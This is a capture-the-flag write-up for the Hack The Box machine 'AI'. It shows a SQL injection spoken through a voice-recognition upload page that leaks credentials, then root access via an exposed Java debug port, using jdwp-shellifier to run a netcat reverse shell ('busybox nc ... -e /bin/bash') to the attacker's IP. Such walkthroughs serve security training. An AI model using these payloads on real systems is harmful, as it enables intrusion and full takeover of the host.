---
title: "AI - HackTheBox"
date: "2020-01-25"
tags: []
---
AI is a machine from Hack The Box with an exploitation method that I've never
seen before.

Let's start with the usual nmap scan:
```
$ nmap -A -T4 10.10.10.163
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-25 14:57 EST
Nmap scan report for 10.10.10.163
Host is up (0.059s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 6d:16:f4:32:eb:46:ca:37:04:d2:a5:aa:74:ed:ab:fc (RSA)
|   256 78:29:78:d9:f5:43:d1:cf:a0:03:55:b1:da:9e:51:b6 (ECDSA)
|_  256 85:2e:7d:66:30:a6:6e:30:04:82:c1:ae:ba:a4:99:bd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Hello AI!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

While visiting the website, the only thing that might be interesting is in
[ai.php](http://10.10.10.163/ai.php):
![](/images/hackthebox/ai/upload.png)

After uploading a random wav file found on the internet, we get this output:
![](/images/hackthebox/ai/randomfile.png)

It looks like there's an online service that does voice recognition and uses
its output to perform a query, and given that in our text there are single
quotes (for example in the verb *wouldn't*), a SQL error has been triggered.

Also, running a web discovery tool allows us to find
[intelligence.php](http://10.10.10.163/intelligence.php):
```
$ gobuster dir -q -r -w lists/raft-small-words-lowercase.txt -x php,html -s 200 -u http://10.10.10.163
/index.php (Status: 200)
/contact.php (Status: 200)
/db.php (Status: 200)
/about.php (Status: 200)
/. (Status: 200)
/ai.php (Status: 200)
/intelligence.php (Status: 200)
```

Here is the page:
![](/images/hackthebox/ai/instructions.png)

We can try to exploit this by recording an audio ourself or using text to speech
services. I will use [text2speech](https://www.text2speech.org/) with these
options:
![](/images/hackthebox/ai/text2speech.png)

Following the guide and after many, many attempts, I've come up with the
following payload:
```
open single quote space union select space username from users comment database
```

And the result is:
![](/images/hackthebox/ai/username.png)

And this payload:
```
open single quote space union select password from users comment database
```

gives us the password:
![](/images/hackthebox/ai/password.png)

Let's try to connect with SSH:
```
alexa@AI:~$ wc -c user.txt
33 user.txt
```
And there's the user flag!

## Privilege escalation

Running the usual recon commands, we can see with `ps aux` an interesting
process running as root:
```
root     128367 21.1  4.7 3108796 95460 ?       Sl   16:06   0:03 /usr/bin/java
-Djava.util.logging.config.file=/opt/apache-tomcat-9.0.27/conf/logging.properties
-Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager
-Djdk.tls.ephemeralDHKeySize=2048
-Djava.protocol.handler.pkgs=org.apache.catalina.webresources
-Dorg.apache.catalina.security.SecurityListener.UMASK=0027
-agentlib:jdwp=transport=dt_socket,address=localhost:8000,server=y,suspend=n
-Dignore.endorsed.dirs= -classpath
/opt/apache-tomcat-9.0.27/bin/bootstrap.jar:/opt/apache-tomcat-9.0.27/bin/tomcat-juli.jar
-Dcatalina.base=/opt/apache-tomcat-9.0.27
-Dcatalina.home=/opt/apache-tomcat-9.0.27
-Djava.io.tmpdir=/opt/apache-tomcat-9.0.27/temp
org.apache.catalina.startup.Bootstrap start
```

A quick google search gives us
[this](https://github.com/IOActive/jdwp-shellifier) exploit that allows
arbitrary code execution. After downloading it on our machine, we have to
forward the port 8000 on the remote machine to our machine, because the service
is running on localhost so we cannot reach it from outside. Let's do so with
`ssh -L 8000:localhost:8000 alexa@10.10.10.163`. Let's start a netcat listener
and run the exploit:
```
$ ./jdwp-shellifier.py -t localhost -p 8000 --cmd 'busybox nc 10.10.14.81 1337 -e /bin/bash'
[+] Targeting 'localhost:8000'
[+] Reading settings for 'OpenJDK 64-Bit Server VM - 11.0.4'
[+] Found Runtime class: id=b8f
[+] Found Runtime.getRuntime(): id=7ff73403e880
[+] Created break event id=2
[+] Waiting for an event on 'java.net.ServerSocket.accept'
[+] Received matching event from thread 0x1
[+] Selected payload 'busybox nc 10.10.14.81 1337 -e /bin/bash'
[+] Command string object created id:c34
[+] Runtime.getRuntime() returned context id:0xc35
[+] found Runtime.exec(): id=7ff73403e8b8
[+] Runtime.exec() successful, retId=c36
[!] Command successfully executed
```


And we got a shell as root! Let's get the flag:
```
$ nc -lnvp 1337
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.10.163.
Ncat: Connection from 10.10.10.163:45658.
whoami
root
wc -c /root/root.txt
33 /root/root.txt
```

Quick and easy, thanks for reading!
